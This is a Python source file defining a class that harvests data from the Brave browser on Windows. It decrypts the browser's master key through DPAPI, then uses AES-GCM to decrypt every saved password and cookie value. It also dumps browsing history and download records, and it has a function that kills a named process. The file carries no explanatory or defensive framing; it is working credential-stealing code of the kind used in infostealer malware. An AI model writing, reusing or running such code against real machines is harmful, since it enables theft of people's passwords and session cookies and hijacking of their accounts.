import os,sys,io
import json
import shutil
import base64
import sqlite3
import browser_cookie3
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timezone, timedelta
import wmi

class Brave:
    def __init__(self):
        self._user_data = os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data"
        
        self._master_key = self._get_master_key()
        
    def get_installed_browsers(self):
        default_dir_paths = ["C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                             "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"]
        for path in default_dir_paths:
            if os.path.exists(path):
                return True
        return False

    def kill_program(self,program_name):
        try:
            f = wmi.WMI()
            for process in f.Win32_Process():
                if program_name in process.Name:
                    process.Terminate()
                    return True
            return False
        except Exception as e:
            return False

    def _get_master_key(self):
        try:
            if self.get_installed_browsers():
                with open(self._user_data + "\\Local State", "r") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
            return None
        except Exception as e:
            return e

    @staticmethod
    def _decrypt(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return str(e)

    @staticmethod
    def _convert_time(time):
        try:
            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
            code_stamp = epoch + timedelta(microseconds=time)
            return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')
        except Exception as e:
            return e

    def convert_size(self,size_bytes):
        try:
            suffixes = ['B', 'KB', 'MB', 'GB']
            suffix_index = 0
            size = float(size_bytes)
            while size >= 1024 and suffix_index < len(suffixes) - 1:
                size /= 1024
                suffix_index += 1
            return f"{size:.2f} {suffixes[suffix_index]}"
        except Exception as e:
            return e
    
    def get_file_path(self, paths):
        for root, dirs, files in os.walk(self._user_data):
            for file in files:
                if file==paths:
                    return os.path.join(root, file)
                
    def brave_passwords(self):
        try:
            login_db = self.get_file_path("Login Data")
            if login_db:
                login_db_copy = os.getenv("TEMP") + "\\Login.db"
                shutil.copy2(login_db, login_db_copy)
                conn = sqlite3.connect(login_db_copy)
                cursor = conn.cursor()

                password_data = ""
                try:
                    cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used, date_password_modified FROM logins order by date_created desc")
                    for item in cursor.fetchall():
                        url = item[0]
                        username = item[1]
                        encrypted_password = item[2]
                        date_created = self._convert_time(item[3])
                        last_used = self._convert_time(item[4])
                        last_modified=self._convert_time(item[5])
                        decrypted_password = self._decrypt(encrypted_password, self._master_key)
                        result = f"URLs: {url}\n"
                        result += f"Username: {username}\n"
                        result += f"Password : {decrypted_password}\n"
                        result += f"Creation date: {date_created}\n"
                        result += f"Last Access date: {last_used}\n"
                        result += f"Last modification date : {last_modified}\n\n"
                    
                        password_data += result
                        # password_data.append({'url': url, 'username': username, 'password': decrypted_password})
                except sqlite3.Error:
                    pass
                cursor.close()
                conn.close()
                os.remove(login_db_copy)
                return password_data
            else:
                return None
        except Exception as e:
            return e
            
    def brave_passwords_to_excel(self):
        try:
            login_db = self.get_file_path("Login Data")
            if login_db:
                login_db_copy = os.getenv("TEMP") + "\\Login.db"
                shutil.copy2(login_db, login_db_copy)
                conn = sqlite3.connect(login_db_copy)
                cursor = conn.cursor()

                password_data =[]
                try:
                    cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used, date_password_modified FROM logins order by date_created desc")
                    for item in cursor.fetchall():
                        url = item[0]
                        username = item[1]
                        encrypted_password = item[2]
                        decrypted_password = self._decrypt(encrypted_password, self._master_key)
                        creation_date= self._convert_time(item[3])
                        last_used = self._convert_time(item[4])
                        last_modified=self._convert_time(item[5])
                        result = [url, username,decrypted_password,creation_date,last_used,last_modified]
                        password_data.append(result)

                except sqlite3.Error:
                    pass

                cursor.close()
                conn.close()
                os.remove(login_db_copy)
                return password_data
            else: return None
        except Exception as e:
            return e
          
    def get_brave_history(self):
        try:
            if self.get_installed_browsers():
                data = ""
                # sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
                history_file_path = self.get_file_path("History")
                if history_file_path:
                    history_db_copy = os.getenv("TEMP") + "\\History.db"
                    shutil.copy2(history_file_path, history_db_copy)
                    conn = sqlite3.connect(history_db_copy)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url,title, last_visit_time FROM urls order by last_visit_time desc")
                    results = cursor.fetchall()
            
                    for row in results:
                        urls = row[0]
                        title = row[1]
                        LastVisitTime = self._convert_time(row[2])
                        messages = f"Urls: {urls}\n"
                        messages+= f"Title: {title}\n"
                        messages+= f"Last Visited: {LastVisitTime}\n\n"
                        data += messages
                    cursor.close()
                    conn.close()
                    os.unlink(history_db_copy)
                    return data
                else: return None
            else:
                return None
        except Exception as e:
            return e
        
    def get_brave_downloads(self):
        try:
            if self.get_installed_browsers():
                history_db =  self.get_file_path("History")
                if history_db:
                    history_db_copy = os.getenv("TEMP") + "\\History.db"
                    shutil.copy2(history_db, history_db_copy)
                    conn = sqlite3.connect(history_db_copy)
                    c = conn.cursor()
                    c.execute("SELECT tab_url, tab_referrer_url , referrer, current_path,target_path, start_time, end_time, received_bytes,total_bytes, last_modified , last_access_time,mime_type FROM downloads order by end_time desc")
                    downloads = c.fetchall()
                    result = ""
                    for download in downloads:
                        resul = f"Urls: {download[0]}\n"
                        resul += f"Referrer Urls: {download[1]}\n"
                        resul += f"Referrer: {download[2]}\n"
                        resul += f"Current Path: {download[3]}\n"
                        resul += f"Target Path: {download[4]}\n"
                        resul += f"Start Time: {self._convert_time(download[5])}\n"
                        resul += f"End Time: {self._convert_time(download[6])}\n"
                        resul += f"Received Bytes: {self.convert_size(download[7])}\n"
                        resul += f"Total Bytes: {self.convert_size(download[7])}\n"
                        resul += f"Last modified: {download[9]}\n"
                        resul += f"Last Access Time: {self._convert_time(download[10])}\n"
                        resul += f"Mime Type: {download[11]}\n\n"
                        result +=resul
                    c.close()
                    conn.close()
                    os.remove(history_db_copy)
                    conn.close()
                    return result 
                else: return None
            else: return None
        except Exception as e:
            return e
                
    def brave_cookies(self):
        if self.get_installed_browsers():
            cookies_data =""
            cookies_path= self.get_file_path("Cookies")
            if cookies_path:
                shutil.copy2(cookies_path, "cookies.db")
                conn= sqlite3.connect("cookies.db")
                connect= conn.cursor()
                connect.execute("SELECT name, host_key,encrypted_value, creation_utc, expires_utc, last_access_utc, source_port FROM cookies")
                rows = connect.fetchall()
                for row in rows:
                    message= f"Cookies Name: {row[0]}\n"
                    message +=f"Domain Name: {row[1]}\n"
                    message +=f"Cookies value : {self._decrypt(row[2],self._master_key)}\n"
                    message +=f"Creation date: {self._convert_time(row[3])}\n"
                    message +=f"Expire date: {self._convert_time(row[4])}\n"
                    message +=f"Last Access date: {self._convert_time(row[5])}\n"
                    message +=f"Source port: {row[6]}\n\n"
                    cookies_data += message
                connect.close()
                conn.close()
                os.unlink("cookies.db")
                return cookies_data 
            else: return None
        else: return None
        
if __name__ == "__main__":
    brave = Brave()
   
    # print(brave.get_file_path("History"))
    